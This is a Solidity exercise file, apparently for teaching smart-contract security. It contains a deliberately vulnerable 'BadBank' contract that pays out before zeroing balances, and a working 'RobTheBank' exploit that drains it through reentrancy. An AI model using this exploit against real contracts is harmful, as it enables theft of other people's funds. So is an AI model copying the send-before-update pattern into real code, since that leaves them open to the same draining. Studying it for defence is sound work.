// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.28;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {console} from "forge-std/Test.sol";

contract BadBank {
    using Address for address;
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        Address.sendValue(payable(msg.sender), balance);
        balances[msg.sender] = 0;
    }
}

contract RobTheBank {
    BadBank public bank;

    constructor(address _bank) {
        bank = BadBank(_bank);
    }

    function rob() public payable {
        // your code here
      console.log ("bank balance before", address(bank).balance);

      // deposit 1 ether
      console.log ("@depositing 1 ETH");
      bank.deposit{value: msg.value}();

      console.log ("bank balance", address(bank).balance);

      console.log ("@calling withdraw");
      bank.withdraw();

      console.log ("@end rob");
    }

    receive() external payable {
      console.log ("bank balance", address (bank).balance);

      // if no more balance stop
      if (address (bank).balance == 0 ether) {
        console.log ("@end reentrancy");
        return;
      }

      console.log ("@reentrancy");
      bank.withdraw ();
      console.log ("@receive unwinds");
    }
}
